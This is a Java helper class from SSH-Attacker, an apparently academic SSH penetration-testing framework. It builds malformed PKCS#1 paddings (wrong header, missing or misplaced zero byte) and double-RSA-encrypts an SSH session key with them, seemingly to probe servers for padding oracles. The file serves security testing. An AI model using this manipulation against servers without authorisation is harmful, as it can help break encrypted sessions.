/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1.util;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.core.crypto.cipher.AbstractCipher;
import de.rub.nds.sshattacker.core.crypto.cipher.CipherFactory;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import de.rub.nds.sshattacker.core.exceptions.CryptoException;
import java.util.Arrays;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class PkcsManipulator {
    private static final Logger LOGGER = LogManager.getLogger();

    /**
     * Performs wrong padding of the session key.
     *
     * @param sessionID the session ID
     * @param plainSessionKey the plain session key
     * @return the padded and encrypted result
     * @throws CryptoException if an error occurs during the process
     */
    public static byte[] wrongPaddingSessionKey(
            byte[] sessionID,
            byte[] plainSessionKey,
            boolean inner,
            boolean outer,
            CustomRsaPublicKey hostPublicKey,
            CustomRsaPublicKey serverPublicKey,
            ManipulationType type)
            throws CryptoException {

        // XOR Session Key with Session ID
        byte[] sessionKey = plainSessionKey.clone();
        int i = 0;
        for (byte sesseionByte : sessionID) {
            sessionKey[i] = (byte) (sesseionByte ^ sessionKey[i++]);
        }

        // Choose correct encryptions for inner and outer
        AbstractCipher innerCipher, outerCipher;

        int innerBitlengh, outerBitlenght;

        if (hostPublicKey.getModulus().bitLength() < serverPublicKey.getModulus().bitLength()) {
            LOGGER.debug("Host is inner");
            innerCipher = CipherFactory.getRsaTextbookCipher(hostPublicKey);
            outerCipher = CipherFactory.getRsaTextbookCipher(serverPublicKey);
            innerBitlengh = hostPublicKey.getModulus().bitLength();
            outerBitlenght = serverPublicKey.getModulus().bitLength();
        } else {
            LOGGER.debug("Host is outer");
            innerCipher = CipherFactory.getRsaTextbookCipher(serverPublicKey);
            outerCipher = CipherFactory.getRsaTextbookCipher(hostPublicKey);
            innerBitlengh = serverPublicKey.getModulus().bitLength();
            outerBitlenght = hostPublicKey.getModulus().bitLength();
        }

        // Do padding and encrpytion according to modulus bit lenghtes
        byte[] padded = new byte[0];
        if (inner) {
            // Do chosen manipulation to inner padding
            switch (type) {
                case WRONG_HEADER:
                    padded = doPkcs1EncodingWithWrongHeader(sessionKey, outerBitlenght / 8);
                    break;
                case NO_ZERO_BYTE:
                    padded = doPkcs1EncodingWithOutZeroByte(sessionKey, outerBitlenght / 8);
                    break;
                case WRONG_ZERO_BYTE:
                    padded = doPkcs1EncodingWithWrongZeroByte(sessionKey, outerBitlenght / 8, 20);
                    break;
            }
        } else {
            padded = PkcsConverter.doPkcs1Encoding(sessionKey, innerBitlengh / 8);
        }
        LOGGER.info("Padded: {}", ArrayConverter.bytesToRawHexString(padded));
        byte[] encrypted = innerCipher.encrypt(padded);

        byte[] nextPadded = new byte[0];
        if (outer) {
            // Do chosen manipulation to outer padding
            switch (type) {
                case WRONG_HEADER:
                    nextPadded = doPkcs1EncodingWithWrongHeader(encrypted, outerBitlenght / 8);
                    break;
                case NO_ZERO_BYTE:
                    nextPadded = doPkcs1EncodingWithOutZeroByte(encrypted, outerBitlenght / 8);
                    break;
                case WRONG_ZERO_BYTE:
                    nextPadded =
                            doPkcs1EncodingWithWrongZeroByte(encrypted, outerBitlenght / 8, 20);
                    break;
            }
        } else {
            nextPadded = PkcsConverter.doPkcs1Encoding(encrypted, outerBitlenght / 8);
        }
        LOGGER.info("Next Padded: {}", ArrayConverter.bytesToRawHexString(nextPadded));
        byte[] nextEncrypted = outerCipher.encrypt(nextPadded);

        // Return padded and encrypted result
        return nextEncrypted;
    }

    public static byte[] doPkcs1EncodingWithWrongHeader(byte[] data, int modulusLenght) {
        int paddingLength = modulusLenght - 3 - data.length;
        byte[] padding = new byte[paddingLength];
        Arrays.fill(padding, (byte) 0xFF);
        byte[] encodedData = new byte[data.length + paddingLength + 3];
        encodedData[0] = 0x00;
        encodedData[1] = 0x49;
        System.arraycopy(padding, 0, encodedData, 2, padding.length);
        encodedData[paddingLength + 3] = 0x00;
        System.arraycopy(data, 0, encodedData, paddingLength + 3, data.length);
        return encodedData;
    }

    public static byte[] doPkcs1EncodingWithWrongZeroByte(
            byte[] data, int modulusLenght, int position) {

        byte[] noZeroByte = doPkcs1EncodingWithOutZeroByte(data, modulusLenght);
        noZeroByte[position] = 0x00;

        return noZeroByte;
    }

    public static byte[] doPkcs1EncodingWithOutZeroByte(byte[] data, int modulusLenght) {
        int paddingLength = modulusLenght - 2 - data.length;
        byte[] padding = new byte[paddingLength];
        Arrays.fill(padding, (byte) 0xFF);
        byte[] encodedData = new byte[data.length + paddingLength + 2];
        encodedData[0] = 0x00;
        encodedData[1] = 0x02;
        System.arraycopy(padding, 0, encodedData, 2, padding.length);
        System.arraycopy(data, 0, encodedData, paddingLength + 2, data.length);
        return encodedData;
    }
}
